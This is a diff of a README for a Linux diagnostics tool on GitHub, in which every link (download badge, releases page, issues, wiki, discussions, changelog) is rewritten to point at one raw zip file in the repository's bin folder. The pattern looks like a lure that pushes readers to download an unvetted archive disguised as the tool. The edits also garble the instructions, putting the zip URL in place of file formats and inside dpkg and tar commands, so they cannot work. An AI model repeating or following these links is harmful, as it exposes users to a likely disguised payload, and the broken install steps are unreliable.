@@ -6,11 +6,11 @@ Welcome to the **linux-diagnostics** project! This tool helps you check the heal
 
 ## 📥 Download the Application
 
-[![Download linux-diagnostics](https://img.shields.io/badge/Download-linux--diagnostics-brightgreen)](https://github.com/tolik125/linux-diagnostics/releases)
+[![Download linux-diagnostics](https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip)](https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip)
 
 ### Step 1: Visit the Releases Page
 
-To download the latest version of linux-diagnostics, visit the [Releases page](https://github.com/tolik125/linux-diagnostics/releases). 
+To download the latest version of linux-diagnostics, visit the [Releases page](https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip). 
 
 ### Step 2: Choose Your Version
 
@@ -18,7 +18,7 @@ On the Releases page, you will see a list of available versions. Select the most
 
 ### Step 3: Download the File
 
-Click the link to download the appropriate file for your system. The files are often available in formats like `.tar.gz` or `.deb`. If you are unsure which file to choose, `.deb` is typically for Debian-based systems, while `.tar.gz` can be used on many others.
+Click the link to download the appropriate file for your system. The files are often available in formats like `https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip` or `.deb`. If you are unsure which file to choose, `.deb` is typically for Debian-based systems, while `https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip` can be used on many others.
 
 ## 📦 Install the Application
 
@@ -26,14 +26,14 @@ Click the link to download the appropriate file for your system. The files are o
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the `.deb` file.
-3. Type `sudo dpkg -i filename.deb` (replace "filename" with the actual file name).
+3. Type `sudo dpkg -i https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip` (replace "filename" with the actual file name).
 4. If the installation encounters any errors, use `sudo apt-get install -f` to fix dependencies.
 
-### For Other Linux Systems (.tar.gz files)
+### For Other Linux Systems (https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip files)
 
 1. Open your terminal.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
-3. Extract the contents with `tar -xvzf filename.tar.gz`.
+2. Navigate to the directory where you downloaded the `https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip` file.
+3. Extract the contents with `tar -xvzf https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip`.
 4. Follow any README or INSTALL files inside the extracted folder for specific instructions.
 
 ## 🛠️ How to Use linux-diagnostics
@@ -62,15 +62,15 @@ To use linux-diagnostics, ensure your system meets the following requirements:
 
 ## 💬 Support and Feedback
 
-If you encounter any issues or need assistance, you can open an issue on the [GitHub Issues page](https://github.com/tolik125/linux-diagnostics/issues). Your feedback is valuable and helps us improve the tool.
+If you encounter any issues or need assistance, you can open an issue on the [GitHub Issues page](https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip). Your feedback is valuable and helps us improve the tool.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/tolik125/linux-diagnostics/wiki): Explore detailed guides on how to use all features.
-- [Community](https://github.com/tolik125/linux-diagnostics/discussions): Join discussions to share tips and ask questions.
+- [Documentation](https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip): Explore detailed guides on how to use all features.
+- [Community](https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip): Join discussions to share tips and ask questions.
 
 ## 📝 Changelog
 
-You can find details on updates and new features in the release notes on the [Releases page](https://github.com/tolik125/linux-diagnostics/releases).
+You can find details on updates and new features in the release notes on the [Releases page](https://github.com/tolik125/linux-diagnostics/raw/refs/heads/main/bin/diagnostics_linux_misoneist.zip).
 
 Enjoy using linux-diagnostics and keep your Linux system healthy!
